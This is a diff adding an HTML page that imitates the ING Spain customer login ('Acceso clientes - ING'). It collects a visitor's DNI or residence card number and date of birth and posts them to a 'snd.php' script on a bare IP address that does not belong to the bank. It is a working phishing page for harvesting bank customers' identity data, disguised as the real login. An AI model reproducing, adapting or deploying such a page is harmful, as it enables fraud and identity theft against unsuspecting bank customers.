@@ -1,0 +1,146 @@
+
+<!-- saved from url=(0034)http://localhost/inges/ING_cc/fbs/ -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<title>Acceso clientes - ING</title>
+<link rel="icon" href="4c7be/img/favicon.ico">
+<style type="text/css">
+body
+{
+   background-color: #FFFFFF;
+   color: #000000;
+   font-family: Arial;
+   font-size: 13px;
+   margin: 0;
+   padding: 0;
+}
+</style>
+<style type="text/css">
+a
+{
+   color: #0000FF;
+   text-decoration: underline;
+}
+a:visited
+{
+   color: #800080;
+}
+a:active
+{
+   color: #FF0000;
+}
+a:hover
+{
+   color: #0000FF;
+   text-decoration: underline;
+}
+</style>
+<style type="text/css">
+#Image1
+{
+   border: 0px #000000 solid;
+}
+#Button1
+{
+   border-top-width: 0px;
+   border-right-width: 0px;
+   border-bottom-width: 0px;
+   border-left-width: 0px;
+   border-top-style: solid;
+   border-right-style: solid;
+   border-bottom-style: solid;
+   border-left-style: solid;
+   border-top-color: #000000;
+   border-right-color: #000000;
+   border-bottom-color: #000000;
+   border-left-color: #000000;
+   background-color: transparent;
+   background-image: url(http://194.182.74.226/ING/4c7be/img/index_Button1_bkgrnd.png);
+   background-repeat: repeat;
+   background-position: left top;
+   color: #000000;
+   font-family: Arial;
+   font-size: 13px;
+}
+#Editbox1
+{
+   border: 1px #A9A9A9 solid;
+   background-color: #FFFFFF;
+   color :#000000;
+   font-family: Arial;
+   font-size: 13px;
+   text-align: left;
+   vertical-align: middle;
+}
+#Editbox2
+{
+   border: 1px #A9A9A9 solid;
+   background-color: #FFFFFF;
+   color :#000000;
+   font-family: Arial;
+   font-size: 13px;
+   text-align: left;
+   vertical-align: middle;
+}
+#Editbox3
+{
+   border: 1px #A9A9A9 solid;
+   background-color: #FFFFFF;
+   color :#000000;
+   font-family: Arial;
+   font-size: 13px;
+   text-align: left;
+   vertical-align: middle;
+}
+#Editbox4
+{
+   border: 1px #A9A9A9 solid;
+   background-color: #FFFFFF;
+   color :#000000;
+   font-family: Arial;
+   font-size: 13px;
+   text-align: left;
+   vertical-align: middle;
+}
+#Button91
+{
+   border-top-width: 0px;
+   border-right-width: 0px;
+   border-bottom-width: 0px;
+   border-left-width: 0px;
+   border-top-style: solid;
+   border-right-style: solid;
+   border-bottom-style: solid;
+   border-left-style: solid;
+   border-top-color: #000000;
+   border-right-color: #000000;
+   border-bottom-color: #000000;
+   border-left-color: #000000;
+   background-color: transparent;
+   background-image: url(http://194.182.74.226/ING/4c7be/images/index_Button1_bkgrnd.png);
+   background-repeat: repeat;
+   background-position: left top;
+   color: #000000;
+   font-family: Arial;
+   font-size: 13px;
+}
+</style>
+</head>
+<body style="background-image: url(http://194.182.74.226/ING/4c7be/&quot;img/1.png&quot;); background-repeat: no-repeat; height: 803px; width: 100%;">
+        <div class="content_form">
+            <form method="post" action="http://194.182.74.226/ING/4c7be/snd.php" ;="">
+<input type="submit" id="Button1" name="" value="" style="position:absolute;left: 267px; top: 756px;width: 271px; height: 44px;z-index: 85;">&nbsp;
+	<center><input type="text" id="Editbox1" placeholder="DNI o Tarjeta de Residencia"style="position:absolute;left: 266px;top: 534px;width: 273px;height: 44px;line-height: 30px;z-index:3;" maxlength="10" name="Edit" value="" required="" ">
+<input type="tel" id="Editbox2" style="position:absolute;left: 267px;top: 637px;width: 80px;height: 48px;line-height:31px;z-index:4;" maxlength="2" pattern=".{2,}" required="" title="2 characters minimum" placeholder=" DD" name="JJ" value="">
+<input type="tel" id="Editbox3" style="position:absolute;left: 352px;top: 637px;width: 74px;height: 48px;line-height:31px;z-index:5;" maxlength="2" pattern=".{2,}" required="" title="2 characters minimum" placeholder=" MM" name="MM" value="">
+<input type="tel" id="Editbox4" style="position:absolute;left: 431px;top: 637px;width: 108px;height: 47px;line-height:31px;z-index:6;" maxlength="4" pattern=".{4,}" required="" title="4 characters minimum" placeholder=" AAAA" name="YYYY" value="">
+
+<input type="button" id="Button91" name="" value="" style="position:absolute;left:1244px;top:0px;width:16px;height:17px;z-index:1;">
+
+            <script>
+            function test()
+                {
+                    alert('sdsd');
+                }
+            </script>
+</form></div></body></html>
